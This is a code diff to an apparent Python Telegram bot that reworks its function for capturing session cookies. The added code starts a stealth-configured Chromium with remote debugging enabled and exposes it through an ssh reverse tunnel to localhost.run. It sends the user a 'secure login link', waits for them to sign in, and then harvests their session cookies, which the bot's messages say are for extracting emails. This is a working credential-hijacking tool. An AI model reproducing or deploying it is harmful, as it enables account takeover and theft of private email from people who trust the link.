@@ -115,7 +115,7 @@ def start(update: Update, context: CallbackContext) -> None:
 # Function to extract cookies via Selenium
 import subprocess
 
-def get_cookies_via_selenium(url, update):
+'''def get_cookies_via_selenium(url, update):
     """ Opens a browser for manual login on a remote server and tunnels it using localhost.run """
     service = Service(ChromeDriverManager().install())
     options = webdriver.ChromeOptions()
@@ -160,6 +160,68 @@ def get_cookies_via_selenium(url, update):
         )
 
         time.sleep(30)  # Wait for user to log in
+
+        cookies = {cookie["name"]: cookie["value"] for cookie in driver.get_cookies()}
+        driver.quit()
+
+        if cookies:
+            update.message.reply_text("✅ **Session cookies captured successfully! Extracting emails now...**")
+            return cookies
+        else:
+            update.message.reply_text("⚠️ **No cookies found. Make sure you logged in properly.**")
+            return {}
+
+    except Exception as e:
+        driver.quit()
+        update.message.reply_text(f"❌ **Error: {e}**")
+        return {}
+'''
+def get_cookies_via_selenium(url, update):
+    """ Opens a browser for manual login on a remote server and tunnels it using localhost.run """
+    service = Service(ChromeDriverManager().install())
+    options = webdriver.ChromeOptions()
+
+    # Use Chromium instead of Google Chrome
+    options.binary_location = "/usr/bin/chromium"  
+
+    options.add_argument("--remote-debugging-port=9222")  
+    options.add_argument("--disable-gpu")
+    options.add_argument("--disable-dev-shm-usage")
+    options.add_argument("--no-sandbox")
+
+    driver = webdriver.Chrome(service=service, options=options)
+
+    stealth(driver, ["en-US", "en"], "Google Inc.", "Win32", "Intel Inc.", "Intel Iris OpenGL Engine", True)
+
+    try:
+        driver.get(url)
+        update.message.reply_text("🔹 **Browser Opened on Server! Setting up a secure login link...**")
+
+        # Start localhost.run tunnel
+        tunnel_cmd = "ssh -R 80:localhost:9222 nokey@localhost.run"
+        tunnel_process = subprocess.Popen(tunnel_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+        # Wait for tunnel to initialize and extract the URL
+        tunnel_url = None
+        for _ in range(10):  
+            output = tunnel_process.stdout.readline().decode().strip()
+            if "https://" in output:
+                tunnel_url = output
+                break
+            time.sleep(1)
+
+        if not tunnel_url:
+            update.message.reply_text("❌ **Tunnel failed to initialize. Try again later.**")
+            return {}
+
+        update.message.reply_text(
+            f"🔹 **Manual Login Required**\n"
+            f"🔗 Click here to log in: [Login Here]({tunnel_url})\n"
+            f"⚠️ **DO NOT close the browser until you see a confirmation!**",
+            parse_mode="Markdown"
+        )
+
+        time.sleep(30)  
 
         cookies = {cookie["name"]: cookie["value"] for cookie in driver.get_cookies()}
         driver.quit()
